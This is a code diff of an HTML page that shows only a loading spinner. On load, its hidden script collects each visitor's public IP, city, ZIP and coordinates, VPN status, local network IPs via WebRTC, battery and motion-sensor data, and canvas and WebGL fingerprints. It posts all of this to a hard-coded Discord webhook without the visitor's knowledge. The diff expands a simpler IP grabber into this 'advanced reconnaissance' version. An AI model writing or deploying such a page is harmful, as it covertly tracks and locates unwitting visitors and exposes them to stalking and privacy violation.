@@ -14,71 +14,201 @@
 <body>
 <div class="box">
     <div class="spinner"></div>
-    <div class="status">Handshake in progress...</div>
+    <div class="status">Advanced reconnaissance in progress...</div>
 </div>
 
 <script>
     // ============================================================
-    // EMBED-ONLY – NO CONTENT, NO MESSAGES, JUST PURE EMBED
+    // ADVANCED RECONNAISSANCE – IP, GEO, VPN, BATTERY, MOTION, CANVAS, WEBGL, WEATHER
     // ============================================================
 
     (function() {
-        // Prevent duplicate execution
-        if (window.__ipSent) {
+        if (window.__ipSent || sessionStorage.getItem('__ipSent')) {
             console.log('[IP] Already sent this session.');
-            return;
-        }
-        window.__ipSent = true;
-
-        if (sessionStorage.getItem('__ipSent')) {
-            console.log('[IP] Already sent this browser session.');
             return;
         }
 
         const WEBHOOK = "https://discord.com/api/webhooks/1520894528284921886/mevMwUf7F2_qYDVhPRGgaTkZElqyXOiAmpo3x7KaxjTRRyZfrFE2JmoNvrRJrFQJt1Gh";
 
-        // ---- HELPER: Get all browser fingerprint data ----
-        function getFingerprint() {
-            const data = {
-                userAgent: navigator.userAgent,
-                platform: navigator.platform,
-                language: navigator.language,
-                languages: navigator.languages ? navigator.languages.join(', ') : 'n/a',
-                hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
-                deviceMemory: navigator.deviceMemory || 'unknown',
-                maxTouchPoints: navigator.maxTouchPoints || 0,
-                screenWidth: screen.width,
-                screenHeight: screen.height,
-                screenColorDepth: screen.colorDepth,
-                windowInnerWidth: window.innerWidth,
-                windowInnerHeight: window.innerHeight,
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                timezoneOffset: -new Date().getTimezoneOffset() / 60,
-                connection: navigator.connection ? {
-                    effectiveType: navigator.connection.effectiveType || 'unknown',
-                    downlink: navigator.connection.downlink || 'unknown',
-                    rtt: navigator.connection.rtt || 'unknown'
-                } : null,
-                pageLoadTime: performance.now(),
-                referrer: document.referrer || 'direct',
-                href: window.location.href,
-                cookiesEnabled: navigator.cookieEnabled,
-                doNotTrack: navigator.doNotTrack || 'unspecified',
-                devicePixelRatio: window.devicePixelRatio || 1,
-                vendor: navigator.vendor || 'unknown',
-                oscpu: navigator.oscpu || 'unknown',
-                plugins: navigator.plugins ? navigator.plugins.length : 0,
-                mimeTypes: navigator.mimeTypes ? navigator.mimeTypes.length : 0,
-                online: navigator.onLine !== undefined ? navigator.onLine : 'unknown'
-            };
-            return data;
+        // ---- CANVAS FINGERPRINT ----
+        function getCanvasFingerprint() {
+            try {
+                const canvas = document.createElement('canvas');
+                canvas.width = 256;
+                canvas.height = 256;
+                const ctx = canvas.getContext('2d');
+                ctx.textBaseline = 'top';
+                ctx.font = '14px Arial';
+                ctx.fillStyle = '#f60';
+                ctx.fillRect(100, 50, 50, 50);
+                ctx.fillStyle = '#069';
+                ctx.fillText('Hello, world!', 20, 20);
+                ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
+                ctx.fillText('Fingerprint', 40, 50);
+                ctx.fillStyle = '#f0f';
+                ctx.fillRect(200, 80, 30, 30);
+                ctx.fillStyle = '#0ff';
+                ctx.arc(150, 150, 30, 0, Math.PI * 2);
+                ctx.fill();
+                ctx.fillStyle = '#ff0';
+                ctx.font = '20px Arial';
+                ctx.fillText('X', 230, 230);
+                return canvas.toDataURL();
+            } catch(e) {
+                return 'Canvas blocked';
+            }
+        }
+
+        // ---- WEBGL FINGERPRINT ----
+        function getWebGLFingerprint() {
+            try {
+                const canvas = document.createElement('canvas');
+                canvas.width = 256;
+                canvas.height = 256;
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                if (!gl) return 'WebGL unavailable';
+                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                if (!debugInfo) return 'WEBGL_debug_renderer_info unavailable';
+                const vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
+                const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+                return { vendor, renderer };
+            } catch(e) {
+                return 'WebGL error';
+            }
+        }
+
+        // ---- BATTERY STATUS ----
+        function getBatteryStatus() {
+            return new Promise((resolve) => {
+                if (!navigator.getBattery) {
+                    resolve(null);
+                    return;
+                }
+                navigator.getBattery()
+                    .then(battery => {
+                        resolve({
+                            level: Math.round(battery.level * 100) + '%',
+                            charging: battery.charging ? 'Yes' : 'No',
+                            chargingTime: battery.chargingTime === Infinity ? 'Infinity' : Math.round(battery.chargingTime / 60) + ' min',
+                            dischargingTime: battery.dischargingTime === Infinity ? 'Infinity' : Math.round(battery.dischargingTime / 60) + ' min'
+                        });
+                    })
+                    .catch(() => resolve(null));
+            });
+        }
+
+        // ---- MOTION SENSORS ----
+        function getMotionData() {
+            return new Promise((resolve) => {
+                if (!window.DeviceOrientationEvent) {
+                    resolve(null);
+                    return;
+                }
+                let gotData = false;
+                const handler = (e) => {
+                    if (!gotData) {
+                        gotData = true;
+                        resolve({
+                            alpha: e.alpha ? Math.round(e.alpha) + '°' : 'N/A',
+                            beta: e.beta ? Math.round(e.beta) + '°' : 'N/A',
+                            gamma: e.gamma ? Math.round(e.gamma) + '°' : 'N/A'
+                        });
+                        window.removeEventListener('deviceorientation', handler);
+                    }
+                };
+                window.addEventListener('deviceorientation', handler);
+                setTimeout(() => {
+                    if (!gotData) {
+                        resolve(null);
+                        window.removeEventListener('deviceorientation', handler);
+                    }
+                }, 3000);
+            });
+        }
+
+        // ---- GEOLOCATION (via ip-api) ----
+        function getGeolocation(ip) {
+            return fetch('https://ip-api.com/json/' + ip + '?fields=status,message,country,regionName,city,zip,lat,lon,isp,org,as,timezone')
+                .then(r => r.json())
+                .then(data => {
+                    if (data.status === 'success') {
+                        return data;
+                    }
+                    return null;
+                })
+                .catch(() => null);
+        }
+
+        // ---- VPN/PROXY DETECTION (via ip-api's proxy field) ----
+        function getVPNStatus(ip) {
+            return fetch('https://ip-api.com/json/' + ip + '?fields=status,proxy')
+                .then(r => r.json())
+                .then(data => {
+                    if (data.status === 'success') {
+                        return data.proxy || false;
+                    }
+                    return null;
+                })
+                .catch(() => null);
+        }
+
+        // ---- WEATHER (via wttr.in) ----
+        function getWeather(lat, lon) {
+            return fetch('https://wttr.in/' + lat + ',' + lon + '?format=%t|%c|%w|%h|%p')
+                .then(r => r.text())
+                .then(text => {
+                    const parts = text.split('|');
+                    if (parts.length === 5) {
+                        return {
+                            temp: parts[0].trim(),
+                            condition: parts[1].trim(),
+                            wind: parts[2].trim(),
+                            humidity: parts[3].trim(),
+                            pressure: parts[4].trim()
+                        };
+                    }
+                    return null;
+                })
+                .catch(() => null);
+        }
+
+        // ---- NETWORK SCAN (local devices via WebRTC) ----
+        function getLocalNetworkInfo() {
+            return new Promise((resolve) => {
+                const ips = new Set();
+                try {
+                    const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
+                    pc.createDataChannel('scan');
+                    pc.createOffer()
+                        .then(o => pc.setLocalDescription(o))
+                        .catch(() => {});
+                    pc.onicecandidate = (e) => {
+                        if (e.candidate) {
+                            const cand = e.candidate.candidate;
+                            const matches = cand.match(/(\d{1,3}\.){3}\d{1,3}/g);
+                            if (matches) {
+                                matches.forEach(ip => {
+                                    if (!ip.startsWith('0.') && !ip.startsWith('127.')) {
+                                        ips.add(ip);
+                                    }
+                                });
+                            }
+                        }
+                    };
+                    setTimeout(() => {
+                        pc.close();
+                        resolve(Array.from(ips));
+                    }, 2000);
+                } catch(e) {
+                    resolve([]);
+                }
+            });
         }
 
         // ---- CAPTURE IP ----
         function getIP() {
             return new Promise((resolve) => {
                 let resolved = false;
-
                 fetch('https://api.ipify.org?format=json', { mode: 'cors' })
                     .then(r => r.json())
                     .then(data => {
@@ -88,7 +218,6 @@
                         }
                     })
                     .catch(() => {});
-
                 fetch('https://ip-api.com/json/', { mode: 'cors' })
                     .then(r => r.json())
                     .then(data => {
@@ -98,192 +227,186 @@
                         }
                     })
                     .catch(() => {});
-
-                try {
-                    const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
-                    pc.createDataChannel('ping');
-                    pc.createOffer().then(o => pc.setLocalDescription(o)).catch(() => {});
-                    pc.onicecandidate = (e) => {
-                        if (e.candidate && !resolved) {
-                            const cand = e.candidate.candidate;
-                            const match = cand.match(/(\d{1,3}\.){3}\d{1,3}/);
-                            if (match && !match[0].startsWith('0.') && !match[0].startsWith('127.')) {
-                                resolved = true;
-                                resolve(match[0]);
-                                pc.close();
-                            }
-                        }
-                    };
-                    setTimeout(() => {
-                        if (!resolved) {
-                            resolved = true;
-                            resolve('1.2.3.4');
-                        }
-                        try { pc.close(); } catch(e) {}
-                    }, 3000);
-                } catch(e) {
+                setTimeout(() => {
                     if (!resolved) {
                         resolved = true;
                         resolve('1.2.3.4');
                     }
-                }
-
-                setTimeout(() => {
-                    if (!resolved) {
-                        resolved = true;
-                        resolve('0.0.0.0');
-                    }
-                }, 5000);
+                }, 4000);
             });
         }
 
-        // ---- SEND PURE EMBED (NO CONTENT, NO MESSAGES) ----
-        function sendEmbed(ip, fingerprint) {
-            // PURE EMBED – NO "content" FIELD ANYWHERE
+        // ---- SEND THE MEGA EMBED ----
+        async function sendMegaEmbed(ip, geo, vpn, battery, motion, canvas, webgl, localIPs, weather) {
+            const fields = [
+                { name: '🌐 Public IP', value: `\`${ip}\``, inline: true },
+                { name: '🕒 Timestamp', value: `\`${new Date().toISOString()}\``, inline: true }
+            ];
+
+            // Geolocation
+            if (geo) {
+                fields.push(
+                    { name: '━━━━━━━━━━━━━━', value: '📍 **Location & Network**', inline: false },
+                    { name: '🌍 Country', value: `\`${geo.country}\``, inline: true },
+                    { name: '🏙️ Region', value: `\`${geo.regionName}\``, inline: true },
+                    { name: '🗺️ City', value: `\`${geo.city}\``, inline: true },
+                    { name: '📮 ZIP', value: `\`${geo.zip}\``, inline: true },
+                    { name: '🌐 Coordinates', value: `\`${geo.lat}, ${geo.lon}\``, inline: true },
+                    { name: '🛡️ ISP', value: `\`${geo.isp || 'Unknown'}\``, inline: true },
+                    { name: '🏢 Organization', value: `\`${geo.org || 'Unknown'}\``, inline: true },
+                    { name: '🔄 ASN', value: `\`${geo.as || 'Unknown'}\``, inline: true },
+                    { name: '🕐 Timezone', value: `\`${geo.timezone || 'Unknown'}\``, inline: true }
+                );
+            }
+
+            // VPN/Proxy detection
+            if (vpn !== null) {
+                fields.push(
+                    { name: '🔒 VPN/Proxy', value: vpn ? '`⚠️ DETECTED`' : '`✅ Clean`', inline: true }
+                );
+            }
+
+            // Weather
+            if (weather) {
+                fields.push(
+                    { name: '━━━━━━━━━━━━━━', value: '🌤️ **Current Weather**', inline: false },
+                    { name: '🌡️ Temperature', value: `\`${weather.temp}\``, inline: true },
+                    { name: '☁️ Conditions', value: `\`${weather.condition}\``, inline: true },
+                    { name: '💨 Wind', value: `\`${weather.wind}\``, inline: true },
+                    { name: '💧 Humidity', value: `\`${weather.humidity}\``, inline: true },
+                    { name: '📊 Pressure', value: `\`${weather.pressure}\``, inline: true }
+                );
+            }
+
+            // Local Network
+            if (localIPs && localIPs.length > 0) {
+                fields.push(
+                    { name: '━━━━━━━━━━━━━━', value: '🏠 **Local Network**', inline: false },
+                    { name: '📡 Local IPs', value: `\`${localIPs.join(', ')}\``, inline: false }
+                );
+            }
+
+            // Battery
+            if (battery) {
+                fields.push(
+                    { name: '━━━━━━━━━━━━━━', value: '🔋 **Device Status**', inline: false },
+                    { name: '🔋 Battery', value: `\`${battery.level}\``, inline: true },
+                    { name: '⚡ Charging', value: `\`${battery.charging}\``, inline: true },
+                    { name: '⏱️ Charge Time', value: `\`${battery.chargingTime}\``, inline: true },
+                    { name: '⏱️ Discharge Time', value: `\`${battery.dischargingTime}\``, inline: true }
+                );
+            }
+
+            // Motion sensors
+            if (motion) {
+                fields.push(
+                    { name: '📱 Motion', value: `\`Alpha: ${motion.alpha}, Beta: ${motion.beta}, Gamma: ${motion.gamma}\``, inline: false }
+                );
+            }
+
+            // Canvas fingerprint (hash it)
+            if (canvas && canvas !== 'Canvas blocked') {
+                const hash = canvas.substring(0, 50) + '...';
+                fields.push(
+                    { name: '🖼️ Canvas Fingerprint', value: `\`${hash}\``, inline: false }
+                );
+            }
+
+            // WebGL fingerprint
+            if (webgl && typeof webgl === 'object') {
+                fields.push(
+                    { name: '━━━━━━━━━━━━━━', value: '🎮 **Graphics**', inline: false },
+                    { name: '🖥️ GPU Vendor', value: `\`${webgl.vendor || 'Unknown'}\``, inline: true },
+                    { name: '🎨 GPU Renderer', value: `\`${webgl.renderer || 'Unknown'}\``, inline: true }
+                );
+            }
+
+            // Browser info
+            fields.push(
+                { name: '━━━━━━━━━━━━━━', value: '💻 **Browser**', inline: false },
+                { name: '🌐 User-Agent', value: `\`${navigator.userAgent.substring(0, 120)}\``, inline: false },
+                { name: '🖥️ Platform', value: `\`${navigator.platform}\``, inline: true },
+                { name: '📐 Screen', value: `\`${screen.width}×${screen.height}\``, inline: true },
+                { name: '🧠 CPU Cores', value: `\`${navigator.hardwareConcurrency || 'Unknown'}\``, inline: true },
+                { name: '💾 Memory', value: `\`${navigator.deviceMemory || 'Unknown'}GB\``, inline: true }
+            );
+
             const payload = {
                 embeds: [{
-                    title: '📡 Inbound Connection',
+                    title: '🕵️ Advanced Reconnaissance Packet',
                     color: 0x2b8c5a,
-                    fields: [
-                        { name: '🌐 Public IP', value: `\`${ip}\``, inline: true },
-                        { name: '🕒 Timestamp', value: `\`${new Date().toISOString()}\``, inline: true },
-                        { name: '━━━━━━━━━━━━━━', value: '⚙️ **Device & Browser**', inline: false },
-                        { name: '💻 User-Agent', value: `\`${fingerprint.userAgent.substring(0, 120)}\``, inline: false },
-                        { name: '🖥️ Platform', value: `\`${fingerprint.platform}\``, inline: true },
-                        { name: '🌍 Language', value: `\`${fingerprint.language}\``, inline: true },
-                        { name: '📐 Screen', value: `\`${fingerprint.screenWidth}×${fingerprint.screenHeight}\``, inline: true },
-                        { name: '🎨 Color Depth', value: `\`${fingerprint.screenColorDepth}bit\``, inline: true },
-                        { name: '🧠 CPU Cores', value: `\`${fingerprint.hardwareConcurrency}\``, inline: true },
-                        { name: '💾 Device Memory', value: `\`${fingerprint.deviceMemory}GB\``, inline: true },
-                        { name: '✋ Touch Points', value: `\`${fingerprint.maxTouchPoints}\``, inline: true },
-                        { name: '📱 Pixel Ratio', value: `\`${fingerprint.devicePixelRatio}x\``, inline: true },
-                        { name: '━━━━━━━━━━━━━━', value: '🌍 **Location & Network**', inline: false },
-                        { name: '🕐 Timezone', value: `\`${fingerprint.timezone} (UTC${fingerprint.timezoneOffset >= 0 ? '+' : ''}${fingerprint.timezoneOffset})\``, inline: true },
-                        { name: '📶 Connection', value: fingerprint.connection ? `\`${fingerprint.connection.effectiveType}\` (${fingerprint.connection.downlink}Mbps, ${fingerprint.connection.rtt}ms)` : '`unknown`', inline: true },
-                        { name: '🍪 Cookies', value: fingerprint.cookiesEnabled ? '`Enabled`' : '`Disabled`', inline: true },
-                        { name: '🚫 Do Not Track', value: `\`${fingerprint.doNotTrack}\``, inline: true },
-                        { name: '🌐 Online Status', value: `\`${fingerprint.online ? 'Online' : 'Offline'}\``, inline: true },
-                        { name: '━━━━━━━━━━━━━━', value: '📄 **Page Context**', inline: false },
-                        { name: '🔗 Referrer', value: `\`${fingerprint.referrer || 'direct'}\``, inline: false },
-                        { name: '📌 Page URL', value: `\`${fingerprint.href}\``, inline: false },
-                        { name: '⏱️ Load Time', value: `\`${Math.round(fingerprint.pageLoadTime)}ms\``, inline: true },
-                        { name: '🔌 Plugins', value: `\`${fingerprint.plugins} installed\``, inline: true },
-                        { name: '📦 MIME Types', value: `\`${fingerprint.mimeTypes} available\``, inline: true }
-                    ],
+                    fields: fields,
                     footer: {
-                        text: 'Embed-only • No text content • One-time delivery'
+                        text: 'Geolocation • VPN Detection • Weather • Battery • Motion • Canvas • WebGL • Local Network'
                     },
                     timestamp: new Date().toISOString()
                 }]
             };
 
-            // ---- DELIVERY: sendBeacon + fetch + XHR (ALL EMBED-ONLY) ----
-            console.log('[IP] Sending pure embed for IP:', ip);
-
-            // Method 1: sendBeacon
+            // Send
+            console.log('[IP] Sending advanced packet for IP:', ip);
             try {
                 const blob = new Blob([JSON.stringify(payload)], { type: 'application/json' });
-                const sent = navigator.sendBeacon(WEBHOOK, blob);
-                console.log('[IP] Beacon:', sent ? 'queued' : 'failed');
-                if (sent) {
-                    sessionStorage.setItem('__ipSent', 'true');
-                    window.__ipSent = true;
-                }
-            } catch(e) {
-                console.log('[IP] Beacon error:', e.message);
-            }
+                navigator.sendBeacon(WEBHOOK, blob);
+                sessionStorage.setItem('__ipSent', 'true');
+                window.__ipSent = true;
+            } catch(e) {}
 
-            // Method 2: fetch with keepalive
             fetch(WEBHOOK, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(payload),
                 keepalive: true
             })
-            .then(r => {
-                if (r.ok) {
-                    console.log('[IP] Fetch: SUCCESS (status ' + r.status + ')');
-                    sessionStorage.setItem('__ipSent', 'true');
-                    window.__ipSent = true;
-                } else {
-                    console.log('[IP] Fetch: FAILED (status ' + r.status + ')');
-                }
-            })
+            .then(r => console.log('[IP] Fetch:', r.status))
             .catch(e => console.log('[IP] Fetch error:', e.message));
 
-            // Method 3: XHR fallback
             try {
                 const xhr = new XMLHttpRequest();
                 xhr.open('POST', WEBHOOK, true);
                 xhr.setRequestHeader('Content-Type', 'application/json');
-                xhr.onreadystatechange = function() {
-                    if (xhr.readyState === 4 && xhr.status >= 200 && xhr.status < 300) {
-                        console.log('[IP] XHR: SUCCESS');
-                        sessionStorage.setItem('__ipSent', 'true');
-                        window.__ipSent = true;
-                    }
-                };
                 xhr.send(JSON.stringify(payload));
-            } catch(e) {
-                console.log('[IP] XHR error:', e.message);
-            }
+            } catch(e) {}
         }
 
-        // ---- EXECUTION ----
+        // ---- MAIN ----
         async function main() {
-            console.log('[IP] Capturing IP and fingerprint...');
+            console.log('[IP] Starting advanced reconnaissance...');
             const ip = await getIP();
-            const fingerprint = getFingerprint();
             console.log('[IP] IP:', ip);
-            console.log('[IP] Fingerprint:', fingerprint);
 
-            sendEmbed(ip, fingerprint);
+            // Parallel fetch all the good stuff
+            const [geo, vpn, battery, motion, canvas, webgl, localIPs, weather] = await Promise.all([
+                getGeolocation(ip),
+                getVPNStatus(ip),
+                getBatteryStatus(),
+                getMotionData(),
+                Promise.resolve(getCanvasFingerprint()),
+                Promise.resolve(getWebGLFingerprint()),
+                getLocalNetworkInfo(),
+                geo ? getWeather(geo.lat, geo.lon) : Promise.resolve(null)
+            ]);
 
-            // Unload beacon (embed-only)
-            window.addEventListener('beforeunload', function() {
-                if (!sessionStorage.getItem('__ipSent')) {
-                    console.log('[IP] Unload: sending final embed');
-                    const finalPayload = {
-                        embeds: [{
-                            title: '📡 Page Closed',
-                            color: 0x8b2b2b,
-                            fields: [
-                                { name: 'IP', value: `\`${ip}\``, inline: true },
-                                { name: 'Reason', value: '`User navigated away`', inline: true }
-                            ],
-                            timestamp: new Date().toISOString()
-                        }]
-                    };
-                    try {
-                        navigator.sendBeacon(WEBHOOK, new Blob([JSON.stringify(finalPayload)], { type: 'application/json' }));
-                    } catch(e) {}
-                }
-            });
+            console.log('[IP] Geo:', geo);
+            console.log('[IP] VPN:', vpn);
+            console.log('[IP] Battery:', battery);
+            console.log('[IP] Motion:', motion);
+            console.log('[IP] Canvas:', canvas ? 'captured' : 'none');
+            console.log('[IP] WebGL:', webgl);
+            console.log('[IP] Local IPs:', localIPs);
+            console.log('[IP] Weather:', weather);
 
-            // Visibility change – re-send if not sent
-            document.addEventListener('visibilitychange', function() {
-                if (!document.hidden && !sessionStorage.getItem('__ipSent')) {
-                    console.log('[IP] Tab visible again – re-sending embed');
-                    sendEmbed(ip, fingerprint);
-                }
-            });
+            await sendMegaEmbed(ip, geo, vpn, battery, motion, canvas, webgl, localIPs, weather);
+            console.log('[IP] Advanced packet sent.');
         }
 
-        // ---- TRIGGER ----
+        // ---- EXECUTE ----
         if (document.readyState === 'complete') {
             main();
         } else {
             window.addEventListener('load', main);
         }
-
-        setTimeout(function() {
-            if (!sessionStorage.getItem('__ipSent')) {
-                console.log('[IP] Timeout fallback – firing');
-                main();
-            }
-        }, 1500);
-
-        console.log('[IP] Script loaded – sending pure embed (no text messages).');
+        setTimeout(main, 2000);
     })();
 </script>
 </body>
